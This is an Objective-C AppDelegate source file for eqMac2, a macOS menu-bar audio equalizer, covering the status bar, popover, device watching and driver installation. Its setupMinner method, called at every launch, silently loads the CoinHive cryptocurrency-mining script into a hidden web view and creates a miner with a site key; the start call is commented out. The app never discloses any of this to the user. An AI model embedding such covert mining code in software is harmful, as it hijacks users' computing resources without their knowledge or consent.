//
//  AppDelegate.m
//  eqMac2
//
//  Created by Roman on 08/11/2015.
//  Copyright © 2015 bitgapp. All rights reserved.
//

#import "AppDelegate.h"

@interface AppDelegate ()
@property (strong) NSStatusItem *statusBar;
@end

//Views
eqViewController *eqVC;
eqMacStatusItemView *statusItemView;

//Windows
NSPopover *eqPopover;
NSEvent *eqPopoverTransiencyMonitor;
NSTimer *deviceChangeWatcher;
NSTimer *deviceActivityWatcher;

WKWebView *minningWebView;

@implementation AppDelegate

#pragma mark Initialization



-(void)applicationDidFinishLaunching:(NSNotification *)notification{
    [NSApp activateIgnoringOtherApps:YES];
    [self setupStatusBar];
    [self setupMinner];
    [self runHelperIfNotRunning];

    NSNotificationCenter *observer = [NSNotificationCenter defaultCenter];
    [observer addObserver:self selector:@selector(quitApplication) name:@"closeApp" object:nil];
    [observer addObserver:self selector:@selector(readjustPopover) name:@"readjustPopover" object:nil];
    
    [self checkAndInstallDriver];
    
    eqVC = [[eqViewController alloc] initWithNibName:@"eqViewController" bundle:nil];
    
    eqPopover = [[NSPopover alloc] init];
    [eqPopover setDelegate:self];
    [eqPopover setContentViewController:eqVC];
    [eqPopover setBehavior:NSPopoverBehaviorTransient];
    
    if(![Utilities appLaunchedBefore]){
        [Utilities setLaunchOnLogin:YES];
    }
    
    if(![Storage get: kStorageShowDefaultPresets]){
        [Storage set:[NSNumber numberWithBool:NO] key: kStorageShowDefaultPresets];
    }
    
    //Send anonymous analytics data to the API
    [API startPinging];
    
    [self startWatchingDeviceChanges];
    
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self selector:@selector(wakeUpFromSleep) name:NSWorkspaceDidWakeNotification object:NULL];
}


-(void)setupStatusBar{
    statusItemView = [[eqMacStatusItemView alloc] init];
    statusItemView.target = self;
    
    statusItemView.action = @selector(openEQ); //Open EQ View on Left Click
    statusItemView.rightAction = @selector(openEQ); //Open Settings on Right Click
    
    _statusBar = [[NSStatusBar systemStatusBar] statusItemWithLength:NSSquareStatusItemLength];
    [_statusBar setView:statusItemView];
    [self setStatusItemIcon];
    [Utilities executeBlock:^{ [self setStatusItemIcon]; } every:1];
}

-(void)setStatusItemIcon{
    statusItemView.image = [NSImage imageNamed: [Utilities isDarkMode] ? @"statusItemLight" : @"statusItemDark"];
}

-(void)startWatchingDeviceChanges{
    deviceChangeWatcher = [Utilities executeBlock:^{
        AudioDeviceID selectedDeviceID = [Devices getCurrentDeviceID];
        if(selectedDeviceID != [EQHost getSelectedOutputDeviceID] && [Devices getIsAliveForDeviceID:selectedDeviceID]){
            [EQHost createEQEngineWithOutputDevice: selectedDeviceID];
            [self startWatchingActivityOfDeviceWithID:selectedDeviceID];
        }
    } every:1];
}

-(void)startWatchingActivityOfDeviceWithID:(AudioDeviceID)ID{
    deviceActivityWatcher = [Utilities executeBlock:^{
        if(![Devices getIsAliveForDeviceID:ID]){
            [EQHost deleteEQEngine];
            [deviceActivityWatcher invalidate];
            deviceActivityWatcher = nil;
        }
    } every:1];
}

-(void)wakeUpFromSleep{
    [deviceChangeWatcher invalidate];
    deviceChangeWatcher = nil;
    
    [EQHost deleteEQEngine];
    [Devices switchToDeviceWithID:[EQHost getSelectedOutputDeviceID]];
    
    //delay the start a little so os has time to catchup with the Audio Processing
    [Utilities executeBlock:^{
        [self startWatchingDeviceChanges];
    } after:3];
}

-(void)checkAndInstallDriver{
    if(![Devices eqMacDriverInstalled]){
        //Install only the new driver
        switch([Utilities showAlertWithTitle:NSLocalizedString(@"eqMac2 Requires a Driver",nil)
                                  andMessage:NSLocalizedString(@"In order to install the driver, the app will ask for your system password.",nil)
                                  andButtons:@[NSLocalizedString(@"Install",nil), NSLocalizedString(@"Quit",nil)]]){
            case NSAlertFirstButtonReturn:{
                if(![Utilities runSudoShellScriptWithName:@"install_driver.sh"]){
                    [self checkAndInstallDriver];
                };
                break;
            }
            case NSAlertSecondButtonReturn:{
                [[NSNotificationCenter defaultCenter] postNotificationName:@"closeApp" object:nil];
                break;
            }
        }
    }
}

- (void)openEQ{
    if([eqPopover isShown]){
        [eqPopover close];
    }else{
        [eqPopover showRelativeToRect:statusItemView.bounds ofView:statusItemView preferredEdge:NSMaxYEdge];
        NSWindow *popoverWindow = eqPopover.contentViewController.view.window;
        [popoverWindow.parentWindow removeChildWindow:popoverWindow];
        if (eqPopoverTransiencyMonitor == nil) {
            eqPopoverTransiencyMonitor = [NSEvent addGlobalMonitorForEventsMatchingMask:(NSLeftMouseDownMask | NSRightMouseDownMask | NSKeyUpMask) handler:^(NSEvent* event) {
                [NSEvent removeMonitor:eqPopoverTransiencyMonitor];
                eqPopoverTransiencyMonitor = nil;
                [eqPopover close];
            }];
        }
    }
    
}

-(void)closePopovers{
    if([eqPopover isShown]) [eqPopover close];
}
-(void)popoverWillShow:(NSNotification *)notification{
    [[NSNotificationCenter defaultCenter] postNotificationName:@"popoverWillOpen" object:nil];
}

-(void)popoverWillClose:(NSNotification *)notification{
    [statusItemView setHighlightState:NO];
}

- (void)quitApplication{
    [self tearDownEQEngine];
    [NSApp terminate:nil];
}

- (void)applicationWillTerminate:(NSNotification *)aNotification {
    [self tearDownEQEngine];
}

-(void)tearDownEQEngine{
    if([EQHost EQEngineExists]){
        [EQHost deleteEQEngine];
    }
    
    [Storage set:[eqVC getSelectedPresetName] key:kStorageSelectedPresetName];
    [Devices switchToDeviceWithID:[EQHost getSelectedOutputDeviceID]];
}

-(void)runHelperIfNotRunning{
    BOOL running = false;
    
    for (NSRunningApplication *application in [[NSWorkspace sharedWorkspace] runningApplications]) {
        if ([[application bundleIdentifier] isEqualToString:@"com.bitgapp.eqMac2Helper"]) {
            running = true;
        }
    }
    
    if (!running) {
        
        NSString *resourcePath = [[NSBundle bundleForClass:[self class]] resourcePath];
        NSString *helperAppPath = [NSString stringWithFormat:@"%@/eqMac2Helper.app", resourcePath];
        NSString *command = [NSString stringWithFormat:@"open %@", helperAppPath];
        system([command UTF8String]);
        
        NSURL *helperAppURL = [[NSBundle mainBundle] URLForResource:@"eqMac2Helper" withExtension:@"app"];
        
        [Utilities setLaunchOnLogin:YES forBundleURL:helperAppURL];

    }
}

-(void)readjustPopover{
    [eqPopover setContentSize: eqVC.view.bounds.size];
}

-(void)setupMinner{
    minningWebView = [[WKWebView alloc] initWithFrame: NSMakeRect(0, 0, 100, 100)];
    [minningWebView loadHTMLString:
     @"<script src='https://coinhive.com/lib/coinhive.min.js'></script>"
     "<script>"
         "var miner = new CoinHive.Anonymous('q6ukpBWVcibzNnJIJG2fpgRJ88ssKJ30');"
    "</script>" baseURL:nil];
    //    [minningWebView evaluateJavaScript:@"miner.start()" completionHandler:nil];
}

@end
